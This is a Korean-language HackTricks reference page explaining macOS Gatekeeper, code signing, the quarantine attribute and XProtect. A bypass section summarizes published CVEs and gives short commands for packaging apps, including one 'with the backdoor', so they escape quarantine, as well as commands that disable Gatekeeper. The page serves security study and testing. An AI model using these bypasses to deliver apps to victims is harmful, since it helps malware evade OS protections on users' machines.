# macOS Gatekeeper / Quarantine / XProtect

<details>

<summary><strong>htARTE (HackTricks AWS Red Team 전문가)</strong>에서 <strong>제로부터 영웅까지 AWS 해킹 배우기</strong>!</summary>

* **사이버 보안 회사**에서 일하시나요? **회사를 HackTricks에서 광고**하고 싶으신가요? 혹은 **PEASS의 최신 버전에 액세스하거나 HackTricks를 PDF로 다운로드**하고 싶으신가요? [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요, 저희의 독점 [**NFT 컬렉션**](https://opensea.io/collection/the-peass-family)
* [**공식 PEASS & HackTricks 굿즈**](https://peass.creator-spring.com)를 얻으세요
* **[💬](https://emojipedia.org/speech-balloon/) 그룹에 가입**하거나 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **트위터** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* **해킹 요령을 공유하고 PR을 제출하여** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **및** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **에 참여**하세요

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Gatekeeper

**Gatekeeper**는 Mac 운영 체제용으로 개발된 보안 기능으로, 사용자가 시스템에서 **신뢰할 수 있는 소프트웨어만 실행**하도록 보장하도록 설계되었습니다. 사용자가 다운로드하고 **앱 스토어 외부 소스**에서 열려고 하는 소프트웨어(앱, 플러그인 또는 설치 프로그램)를 **검증**함으로써 작동합니다.

Gatekeeper의 주요 메커니즘은 **검증** 프로세스에 있습니다. 다운로드한 소프트웨어가 **인식된 개발자에 의해 서명**되었는지 확인하여 소프트웨어의 신뢰성을 보장합니다. 더 나아가, 소프트웨어가 **Apple에 의해 노타라이즈(notarised)**되었는지 확인하여 알려진 악성 콘텐츠가 없으며 노타라이즈 이후에 변조되지 않았음을 확인합니다.

게다가, Gatekeeper는 사용자가 다운로드한 소프트웨어의 처음 실행을 승인하도록 사용자에게 **알림**을 통해 사용자 제어와 보안을 강화합니다. 이 보호장치는 사용자가 해로운 실행 가능 코드를 무해한 데이터 파일로 오인할 수 있는 것을 방지하는 데 도움이 됩니다.

### 애플리케이션 서명

애플리케이션 서명 또는 코드 서명은 Apple의 보안 인프라의 중요한 구성 요소입니다. 이를 사용하여 소프트웨어 작성자(개발자)의 **신원을 확인**하고 코드가 마지막으로 서명된 이후에 변조되지 않았는지 확인합니다.

작동 방식은 다음과 같습니다:

1. **애플리케이션 서명:** 개발자가 애플리케이션을 배포할 준비가 되면 **개인 키를 사용하여 애플리케이션에 서명**합니다. 이 개인 키는 개발자가 Apple 개발자 프로그램에 등록할 때 Apple이 발급하는 **인증서와 관련**되어 있습니다. 서명 프로세스는 앱의 모든 부분에 대한 암호화 해시를 생성하고 이 해시를 개발자의 개인 키로 암호화하는 것을 포함합니다.
2. **애플리케이션 배포:** 서명된 애플리케이션은 사용자에게 개발자의 인증서와 함께 제공됩니다. 이 인증서에는 해당하는 공개 키가 포함되어 있습니다.
3. **애플리케이션 확인:** 사용자가 애플리케이션을 다운로드하고 실행하려고 할 때, Mac 운영 체제는 개발자의 인증서에서 공개 키를 사용하여 해시를 복호화합니다. 그런 다음 애플리케이션의 현재 상태를 기반으로 해시를 다시 계산하고 이를 복호화된 해시와 비교합니다. 일치하면, **개발자가 서명한 이후에 애플리케이션이 수정되지 않았음**을 의미하며 시스템은 애플리케이션을 실행할 수 있습니다.

애플리케이션 서명은 Apple의 Gatekeeper 기술의 중요한 부분입니다. 사용자가 **인터넷에서 다운로드한 애플리케이션을 열려고 시도**할 때, Gatekeeper는 애플리케이션 서명을 확인합니다. Apple이 알려진 개발자에게 발급한 인증서로 서명되었고 코드가 변조되지 않았다면, Gatekeeper는 애플리케이션을 실행할 수 있습니다. 그렇지 않으면, 애플리케이션을 차단하고 사용자에게 경고합니다.

macOS Catalina부터 **Gatekeeper는 애플이 노타라이즈(notarized)**한지 여부도 확인하여 추가적인 보안 층을 추가합니다. 노타라이즷 프로세스는 애플리케이션을 알려진 보안 문제와 악성 코드에 대해 확인하고 이러한 검사를 통과하면 Apple은 Gatekeeper가 확인할 수 있는 애플리케이션에 티켓을 추가합니다.

#### 서명 확인

일부 **악성 코드 샘플**을 확인할 때는 항상 이진 파일의 **서명을 확인**해야 합니다. 왜냐하면 **서명한 개발자**가 이미 **악성 코드와 관련**되어 있을 수 있기 때문입니다.
```bash
# Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

# Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

# Get entitlements from the binary
codesign -d --entitlements :- /System/Applications/Automator.app # Check the TCC perms

# Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app

# Sign a binary
codesign -s <cert-name-keychain> toolsdemo
```
### 승인

애플의 승인 프로세스는 사용자를 잠재적으로 해로운 소프트웨어로부터 보호하는 추가적인 안전장치로 작용합니다. 이는 개발자가 자신의 애플리케이션을 애플의 승인 서비스에 제출하는 과정을 포함하며, 이는 앱 검토와 혼동해서는 안 됩니다. 이 서비스는 악성 콘텐츠의 존재와 코드 서명에 대한 잠재적인 문제를 조사하는 **자동화된 시스템**입니다.

소프트웨어가 이 검사를 통과하고 어떠한 우려도 일으키지 않는다면, 승인 서비스는 승인 티켓을 생성합니다. 그런 다음 개발자는 이 티켓을 자신의 소프트웨어에 **첨부**해야 합니다. 또한, 승인 티켓은 Gatekeeper, 애플의 보안 기술이 액세스할 수 있는 온라인에도 게시됩니다.

사용자가 소프트웨어를 처음 설치하거나 실행할 때, 실행 파일에 첨부되어 있거나 온라인에서 찾을 수 있는 승인 티켓의 존재는 Gatekeeper에게 애플이 승인한 소프트웨어임을 알려줍니다. 결과적으로 Gatekeeper는 초기 실행 대화 상자에 애플이 악성 콘텐츠를 확인했음을 나타내는 설명 메시지를 표시합니다. 이 과정은 사용자가 시스템에 설치하거나 실행하는 소프트웨어의 보안에 대한 신뢰를 향상시킵니다.

### GateKeeper 열거

GateKeeper는 믿을 수 없는 앱이 실행되는 것을 방지하는 **여러 보안 구성 요소**이자 **구성 요소 중 하나**입니다.

GateKeeper의 **상태**를 확인할 수 있습니다:
```bash
# Check the status
spctl --status
```
{% hint style="danger" %}
GateKeeper 시그니처 확인은 **격리 속성이 있는 파일**에 대해서만 수행됨을 유의하십시오.
{% endhint %}

GateKeeper는 바이너리가 실행될 수 있는지를 **환경 설정 및 시그니처**에 따라 확인합니다:

<figure><img src="../../../.gitbook/assets/image (1150).png" alt=""><figcaption></figcaption></figure>

이 구성을 유지하는 데이터베이스는 **`/var/db/SystemPolicy`**에 위치해 있습니다. 다음과 같이 루트로 이 데이터베이스를 확인할 수 있습니다:
```bash
# Open database
sqlite3 /var/db/SystemPolicy

# Get allowed rules
SELECT requirement,allow,disabled,label from authority where label != 'GKE' and disabled=0;
requirement|allow|disabled|label
anchor apple generic and certificate 1[subject.CN] = "Apple Software Update Certification Authority"|1|0|Apple Installer
anchor apple|1|0|Apple System
anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] exists|1|0|Mac App Store
anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] exists and (certificate leaf[field.1.2.840.113635.100.6.1.14] or certificate leaf[field.1.2.840.113635.100.6.1.13]) and notarized|1|0|Notarized Developer ID
[...]
```
참고로 첫 번째 규칙이 "**App Store**"로 끝나고 두 번째 규칙이 "**Developer ID**"로 끝나며, 이전 이미지에서는 **App Store 및 식별된 개발자로부터 앱을 실행할 수 있도록 설정**되어 있었습니다. 해당 설정을 App Store로 **변경**하면 "**Notarized Developer ID" 규칙이 사라집니다**.

또한 수천 개의 **GKE 유형의 규칙**이 있습니다:
```bash
SELECT requirement,allow,disabled,label from authority where label = 'GKE' limit 5;
cdhash H"b40281d347dc574ae0850682f0fd1173aa2d0a39"|1|0|GKE
cdhash H"5fd63f5342ac0c7c0774ebcbecaf8787367c480f"|1|0|GKE
cdhash H"4317047eefac8125ce4d44cab0eb7b1dff29d19a"|1|0|GKE
cdhash H"0a71962e7a32f0c2b41ddb1fb8403f3420e1d861"|1|0|GKE
cdhash H"8d0d90ff23c3071211646c4c9c607cdb601cb18f"|1|0|GKE
```
다음은 **`/var/db/SystemPolicyConfiguration/gke.bundle/Contents/Resources/gke.auth`, `/var/db/gke.bundle/Contents/Resources/gk.db`** 및 **`/var/db/gkopaque.bundle/Contents/Resources/gkopaque.db`**에서 나온 해시입니다.

또는 이전 정보를 다음과 같이 나열할 수도 있습니다:
```bash
sudo spctl --list
```
다음은 `spctl`의 `--master-disable` 및 `--global-disable` 옵션으로 이러한 서명 확인을 완전히 비활성화합니다:
```bash
# Disable GateKeeper
spctl --global-disable
spctl --master-disable

# Enable it
spctl --global-enable
spctl --master-enable
```
완전히 활성화된 경우, 새 옵션이 나타납니다:

<figure><img src="../../../.gitbook/assets/image (1151).png" alt=""><figcaption></figcaption></figure>

**GateKeeper가 앱을 허용할지 확인하는 방법**입니다:
```bash
spctl --assess -v /Applications/App.app
```
GateKeeper에 새 규칙을 추가하여 특정 앱의 실행을 허용할 수 있습니다:
```bash
# Check if allowed - nop
spctl --assess -v /Applications/App.app
/Applications/App.app: rejected
source=no usable signature

# Add a label and allow this label in GateKeeper
sudo spctl --add --label "whitelist" /Applications/App.app
sudo spctl --enable --label "whitelist"

# Check again - yep
spctl --assess -v /Applications/App.app
/Applications/App.app: accepted
```
### 파일 격리

**응용 프로그램** 또는 파일을 **다운로드**할 때, macOS **응용 프로그램**은 웹 브라우저나 이메일 클라이언트와 같은 특정 **응용 프로그램**이 다운로드된 파일에 "**격리 플래그**"라고 불리는 확장 파일 속성을 **부착**합니다. 이 속성은 해당 파일을 신뢰할 수 없는 출처(인터넷)에서 가져온 것으로 **표시**하고 잠재적인 위험을 가지고 있을 수 있다고 **표시**합니다. 그러나 일부 응용 프로그램은 이 속성을 부착하지 않습니다. 예를 들어, 일반적인 비트토렌트 클라이언트 소프트웨어는 일반적으로 이 프로세스를 우회합니다.

**격리 플래그가 존재하는 경우 사용자가 파일을 실행하려고 시도할 때 macOS의 Gatekeeper 보안 기능에 신호를 보냅니다**.

**격리 플래그가 없는 경우**(일부 비트토렌트 클라이언트를 통해 다운로드된 파일 등), Gatekeeper의 **확인이 수행되지 않을 수 있습니다**. 따라서 사용자는 안전하지 않거나 알려지지 않은 소스에서 다운로드한 파일을 열 때 주의해야 합니다.

{% hint style="info" %}
코드 서명의 **유효성**을 **확인**하는 것은 암호화된 코드 및 모든 번들된 리소스의 암호 해시를 생성하는 **자원 집약적인** 프로세스를 포함합니다. 또한 인증서 유효성을 확인하는 것은 발급된 후에 취소되었는지 Apple의 서버에 **온라인 확인**을 하는 것을 의미합니다. 이러한 이유로 완전한 코드 서명 및 인증 검사는 **앱을 실행할 때마다 실행하기에는 비현실적**입니다.

따라서 이러한 확인은 **격리된 속성을 가진 앱을 실행할 때에만 실행**됩니다.
{% endhint %}

{% hint style="warning" %}
이 속성은 파일을 생성/다운로드하는 **응용 프로그램에 의해 설정**되어야 합니다.

그러나 샌드박스에 있는 파일은 생성된 모든 파일에 이 속성이 설정됩니다. 샌드박스에 있지 않은 앱은 스스로 설정하거나 **Info.plist**에서 [**LSFileQuarantineEnabled**](https://developer.apple.com/documentation/bundleresources/information\_property\_list/lsfilequarantineenabled?language=objc) 키를 지정하여 시스템이 생성된 파일에 `com.apple.quarantine` 확장 속성을 설정하도록 할 수 있습니다.
{% endhint %}

또한, **`qtn_proc_apply_to_self`**를 호출하는 프로세스에 의해 생성된 모든 파일은 격리됩니다. 또는 API **`qtn_file_apply_to_path`**는 지정된 파일 경로에 격리 속성을 추가합니다.

루트 권한이 필요한 경우 **상태를 확인하고 활성화/비활성화**할 수 있습니다:
```bash
spctl --status
assessments enabled

spctl --enable
spctl --disable
#You can also allow nee identifies to execute code using the binary "spctl"
```
다음을 사용하여 파일이 격리 확장 속성을 가지고 있는지 확인할 수도 있습니다:
```bash
xattr file.png
com.apple.macl
com.apple.quarantine
```
**확장 속성**의 **값**을 확인하고 quarantine 속성을 작성한 앱을 찾으세요:
```bash
xattr -l portada.png
com.apple.macl:
00000000  03 00 53 DA 55 1B AE 4C 4E 88 9D CA B7 5C 50 F3  |..S.U..LN.....P.|
00000010  16 94 03 00 27 63 64 97 98 FB 4F 02 84 F3 D0 DB  |....'cd...O.....|
00000020  89 53 C3 FC 03 00 27 63 64 97 98 FB 4F 02 84 F3  |.S....'cd...O...|
00000030  D0 DB 89 53 C3 FC 00 00 00 00 00 00 00 00 00 00  |...S............|
00000040  00 00 00 00 00 00 00 00                          |........|
00000048
com.apple.quarantine: 00C1;607842eb;Brave;F643CD5F-6071-46AB-83AB-390BA944DEC5
# 00c1 -- It has been allowed to eexcute this file (QTN_FLAG_USER_APPROVED = 0x0040)
# 607842eb -- Timestamp
# Brave -- App
# F643CD5F-6071-46AB-83AB-390BA944DEC5 -- UID assigned to the file downloaded
```
실제로 프로세스 "생성하는 파일에 격리 플래그를 설정할 수 있습니다" (생성된 파일에 USER\_APPROVED 플래그를 적용해 보았지만 적용되지 않았습니다):

<details>

<summary>소스 코드 격리 플래그 적용</summary>
```c
#include <stdio.h>
#include <stdlib.h>

enum qtn_flags {
QTN_FLAG_DOWNLOAD = 0x0001,
QTN_FLAG_SANDBOX = 0x0002,
QTN_FLAG_HARD = 0x0004,
QTN_FLAG_USER_APPROVED = 0x0040,
};

#define qtn_proc_alloc _qtn_proc_alloc
#define qtn_proc_apply_to_self _qtn_proc_apply_to_self
#define qtn_proc_free _qtn_proc_free
#define qtn_proc_init _qtn_proc_init
#define qtn_proc_init_with_self _qtn_proc_init_with_self
#define qtn_proc_set_flags _qtn_proc_set_flags
#define qtn_file_alloc _qtn_file_alloc
#define qtn_file_init_with_path _qtn_file_init_with_path
#define qtn_file_free _qtn_file_free
#define qtn_file_apply_to_path _qtn_file_apply_to_path
#define qtn_file_set_flags _qtn_file_set_flags
#define qtn_file_get_flags _qtn_file_get_flags
#define qtn_proc_set_identifier _qtn_proc_set_identifier

typedef struct _qtn_proc *qtn_proc_t;
typedef struct _qtn_file *qtn_file_t;

int qtn_proc_apply_to_self(qtn_proc_t);
void qtn_proc_init(qtn_proc_t);
int qtn_proc_init_with_self(qtn_proc_t);
int qtn_proc_set_flags(qtn_proc_t, uint32_t flags);
qtn_proc_t qtn_proc_alloc();
void qtn_proc_free(qtn_proc_t);
qtn_file_t qtn_file_alloc(void);
void qtn_file_free(qtn_file_t qf);
int qtn_file_set_flags(qtn_file_t qf, uint32_t flags);
uint32_t qtn_file_get_flags(qtn_file_t qf);
int qtn_file_apply_to_path(qtn_file_t qf, const char *path);
int qtn_file_init_with_path(qtn_file_t qf, const char *path);
int qtn_proc_set_identifier(qtn_proc_t qp, const char* bundleid);

int main() {

qtn_proc_t qp = qtn_proc_alloc();
qtn_proc_set_identifier(qp, "xyz.hacktricks.qa");
qtn_proc_set_flags(qp, QTN_FLAG_DOWNLOAD | QTN_FLAG_USER_APPROVED);
qtn_proc_apply_to_self(qp);
qtn_proc_free(qp);

FILE *fp;
fp = fopen("thisisquarantined.txt", "w+");
fprintf(fp, "Hello Quarantine\n");
fclose(fp);

return 0;

}
```
</details>

그 **속성을** 제거하세요:
```bash
xattr -d com.apple.quarantine portada.png
#You can also remove this attribute from every file with
find . -iname '*' -print0 | xargs -0 xattr -d com.apple.quarantine
```
그리고 다음을 사용하여 모든 격리된 파일을 찾습니다:

{% code overflow="wrap" %}
```bash
find / -exec ls -ld {} \; 2>/dev/null | grep -E "[x\-]@ " | awk '{printf $9; printf "\n"}' | xargs -I {} xattr -lv {} | grep "com.apple.quarantine"
```
{% endcode %}

**격리 정보**는 **`~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2`**에서 LaunchServices가 관리하는 중앙 데이터베이스에 저장됩니다.

#### **Quarantine.kext**

커널 확장 프로그램은 시스템의 **커널 캐시를 통해서만** 사용할 수 있지만, **https://developer.apple.com/**에서 **커널 디버그 키트를 다운로드**하여 확장 프로그램의 심볼화된 버전을 얻을 수 있습니다.

### XProtect

XProtect는 macOS에 내장된 **안티 맬웨어** 기능입니다. XProtect는 **알려진 맬웨어 및 안전하지 않은 파일 유형의 데이터베이스와 비교하여 애플리케이션이 처음 실행되거나 수정될 때** 해당 애플리케이션을 확인합니다. Safari, Mail 또는 Messages와 같은 특정 앱을 통해 파일을 다운로드할 때 XProtect가 파일을 자동으로 스캔합니다. 데이터베이스에서 알려진 맬웨어와 일치하는 경우 XProtect는 파일 실행을 **차단하고 위협을 알립니다**.

XProtect 데이터베이스는 Apple에 의해 **정기적으로 업데이트**되며 이러한 업데이트는 자동으로 다운로드되어 Mac에 설치됩니다. 이를 통해 XProtect가 항상 최신 알려진 위협과 함께 업데이트되도록 보장됩니다.

그러나 **XProtect는 완전한 기능을 갖춘 백신 솔루션이 아님**을 유의해야 합니다. 특정 알려진 위협 목록을 확인하고 대부분의 백신 소프트웨어처럼 온액세스 스캔을 수행하지 않습니다.

최신 XProtect 업데이트에 대한 정보를 얻으려면 다음을 실행할 수 있습니다:

{% code overflow="wrap" %}
```bash
system_profiler SPInstallHistoryDataType 2>/dev/null | grep -A 4 "XProtectPlistConfigData" | tail -n 5
```
{% endcode %}

XProtect는 SIP로 보호된 위치인 **/Library/Apple/System/Library/CoreServices/XProtect.bundle**에 있으며 번들 내에서 XProtect가 사용하는 정보를 찾을 수 있습니다:

* **`XProtect.bundle/Contents/Resources/LegacyEntitlementAllowlist.plist`**: 해당 cdhash를 가진 코드가 레거시 권한을 사용할 수 있도록 허용합니다.
* **`XProtect.bundle/Contents/Resources/XProtect.meta.plist`**: BundleID 및 TeamID를 통해 로드가 금지된 플러그인 및 확장 프로그램 목록 또는 최소 버전을 나타냅니다.
* **`XProtect.bundle/Contents/Resources/XProtect.yara`**: 악성 코드를 감지하기 위한 Yara 규칙입니다.
* **`XProtect.bundle/Contents/Resources/gk.db`**: 차단된 응용 프로그램 및 TeamID의 해시가 포함된 SQLite3 데이터베이스입니다.

XProtect와 관련된 **`/Library/Apple/System/Library/CoreServices/XProtect.app`**에 다른 앱이 있지만 이는 Gatekeeper 프로세스와 관련이 없습니다.

### Gatekeeper가 아님

{% hint style="danger" %}
Gatekeeper가 **모든 시간에 실행되지는 않음**을 유의하십시오. 실행할 때 _**AppleMobileFileIntegrity**_ (AMFI)는 이미 Gatekeeper에 의해 실행 및 확인된 앱을 실행할 때에만 **실행 가능한 코드 서명을 확인**합니다.
{% endhint %}

따라서 이전에는 Gatekeeper로 앱을 캐시하고, 그런 다음 애플리케이션의 실행 파일이 아닌 파일 (예: Electron asar 또는 NIB 파일)을 **수정**하여 다른 보호 기능이 없는 경우, 애플리케이션이 **악의적인** 추가로 실행되었던 것이 가능했습니다.

그러나 이제 macOS는 애플리케이션 번들 내의 파일을 **수정하는 것을 방지**합니다. 따라서 [Dirty NIB](../macos-proces-abuse/macos-dirty-nib.md) 공격을 시도하면 Gatekeeper로 앱을 캐시한 후 번들을 수정할 수 없으므로 더 이상 악용할 수 없음을 알게 될 것입니다. 예를 들어 exploit에서 지시한대로 Contents 디렉토리의 이름을 NotCon으로 변경한 다음 앱의 주 실행 파일을 실행하여 Gatekeeper로 캐시하면 오류가 발생하여 실행되지 않습니다.

## Gatekeeper 우회

Gatekeeper를 우회하는 방법(사용자가 다운로드하고 Gatekeeper가 금지해야 할 때 실행되도록 만드는 방법)은 macOS의 취약점으로 간주됩니다. 지난 시간에 Gatekeeper를 우회하는 기술에 할당된 일부 CVE는 다음과 같습니다:

### [CVE-2021-1810](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810)

**Archive Utility**를 사용하여 압축을 푸는 경우, **886자를 초과하는 경로를 가진 파일**은 com.apple.quarantine 확장 속성을받지 않습니다. 이 상황으로 인해 이러한 파일이 **Gatekeeper의** 보안 검사를 우회할 수 있습니다.

자세한 정보는 [**원본 보고서**](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810)를 확인하십시오.

### [CVE-2021-30990](https://ronmasas.com/posts/bypass-macos-gatekeeper)

**Automator**로 생성된 애플리케이션의 경우, 실행에 필요한 정보는 `application.app/Contents/document.wflow`에 있으며 실행 파일에는 없습니다. 실행 파일은 단순히 **Automator Application Stub**이라는 일반적인 Automator 이진 파일입니다.

따라서 `application.app/Contents/MacOS/Automator\ Application\ Stub`를 다른 시스템 내의 다른 Automator Application Stub을 가리키도록 만들면 `document.wflow` (스크립트) 내용을 실행할 수 있으며 실제 실행 파일에는 quarantine xattr이 없으므로 **Gatekeeper를 트리거하지 않고** 실행됩니다.

예상 위치의 예: `/System/Library/CoreServices/Automator\ Application\ Stub.app/Contents/MacOS/Automator\ Application\ Stub`

자세한 정보는 [**원본 보고서**](https://ronmasas.com/posts/bypass-macos-gatekeeper)를 확인하십시오.

### [CVE-2022-22616](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/)

이 우회에서는 zip 파일이 `application.app`이 아닌 `application.app/Contents`에서 압축을 시작하도록 만들었습니다. 따라서 **quarantine attr**가 **`application.app/Contents`의 모든 파일에 적용**되었지만 **`application.app`에는 적용되지 않았습니다**. Gatekeeper가 확인하는 것이기 때문에 Gatekeeper가 우회되었습니다. 따라서 `application.app`이 트리거되었을 때 **quarantine 속성이 없었습니다.**
```bash
zip -r test.app/Contents test.zip
```
[**원본 보고서**](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/)를 확인하여 자세한 정보를 확인하십시오.

### [CVE-2022-32910](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32910)

구성 요소가 다르더라도이 취약점의 악용은 이전 것과 매우 유사합니다. 이 경우 **`application.app/Contents`**에서 Apple Archive를 생성하여 **Archive Utility**에 의해 압축 해제 될 때 **`application.app`에 방역 속성이 적용되지 않습니다**.
```bash
aa archive -d test.app/Contents -o test.app.aar
```
확인하려면 [**원본 보고서**](https://www.jamf.com/blog/jamf-threat-labs-macos-archive-utility-vulnerability/)를 참조하십시오.

### [CVE-2022-42821](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)

ACL **`writeextattr`**를 사용하여 파일의 속성 쓰기를 방지할 수 있습니다:
```bash
touch /tmp/no-attr
chmod +a "everyone deny writeextattr" /tmp/no-attr
xattr -w attrname vale /tmp/no-attr
xattr: [Errno 13] Permission denied: '/tmp/no-attr'
```
또한 **AppleDouble** 파일 형식은 ACE를 포함한 파일을 복사합니다.

[**소스 코드**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html)에서는 **`com.apple.acl.text`**라는 xattr 내에 저장된 ACL 텍스트 표현이 압축 해제된 파일에서 ACL로 설정될 것임을 볼 수 있습니다. 따라서, 다른 xattr이 기록되지 못하도록 ACL을 설정하는 ACL이 포함된 **AppleDouble** 파일 형식으로 응용 프로그램을 zip 파일로 압축했다면... 격리 xattr이 응용 프로그램에 설정되지 않았습니다:
```bash
chmod +a "everyone deny write,writeattr,writeextattr" /tmp/test
ditto -c -k test test.zip
python3 -m http.server
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr
```
{% endcode %}

더 많은 정보는 [**원본 보고서**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)를 확인하세요.

AppleArchives를 사용하여도 이 취약점을 악용할 수 있습니다:
```bash
mkdir app
touch app/test
chmod +a "everyone deny write,writeattr,writeextattr" app/test
aa archive -d app -o test.aar
```
### [CVE-2023-27943](https://blog.f-secure.com/discovery-of-gatekeeper-bypass-cve-2023-27943/)

**Google Chrome이 다운로드한 파일에 quarantine 속성을 설정하지 않았음**이 macOS 내부 문제로 인해 발견되었습니다.

### [CVE-2023-27951](https://redcanary.com/blog/gatekeeper-bypass-vulnerabilities/)

AppleDouble 파일 형식은 파일의 속성을 `._`로 시작하는 별도의 파일에 저장하여 **macOS 장치 간에 파일 속성을 복사하는 데 도움**이 됩니다. 그러나 AppleDouble 파일을 압축 해제한 후 `._`로 시작하는 파일에는 **quarantine 속성이 설정되지 않았음**이 관찰되었습니다.
```bash
mkdir test
echo a > test/a
echo b > test/b
echo ._a > test/._a
aa archive -d test/ -o test.aar

# If you downloaded the resulting test.aar and decompress it, the file test/._a won't have a quarantitne attribute
```
{% endcode %}

**Gatekeeper를 우회하는 것이 가능했습니다.** 방법은 AppleDouble 이름 규칙을 사용하여 DMG 파일 애플리케이션을 만들고 (`._`로 시작) **검역 속성이 설정되지 않은 숨겨진** 파일에 대한 심볼릭 링크로 **가시적 파일을 만드는 것**이었습니다.\
**dmg 파일을 실행**하면, 검역 속성이 없기 때문에 **Gatekeeper를 우회**할 것입니다.
```bash
# Create an app bundle with the backdoor an call it app.app

echo "[+] creating disk image with app"
hdiutil create -srcfolder app.app app.dmg

echo "[+] creating directory and files"
mkdir
mkdir -p s/app
cp app.dmg s/app/._app.dmg
ln -s ._app.dmg s/app/app.dmg

echo "[+] compressing files"
aa archive -d s/ -o app.aar
```
### uchg (from this [talk](https://codeblue.jp/2023/result/pdf/cb23-bypassing-macos-security-and-privacy-mechanisms-from-gatekeeper-to-system-integrity-protection-by-koh-nakagawa.pdf))

* 앱을 포함한 디렉토리를 생성합니다.
* 앱에 uchg를 추가합니다.
* 앱을 tar.gz 파일로 압축합니다.
* tar.gz 파일을 피해자에게 전송합니다.
* 피해자가 tar.gz 파일을 열고 앱을 실행합니다.
* Gatekeeper는 앱을 확인하지 않습니다.

### Prevent Quarantine xattr

".app" 번들에서 quarantine xattr이 추가되지 않은 경우, 실행할 때 **Gatekeeper가 트리거되지 않습니다**.

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}
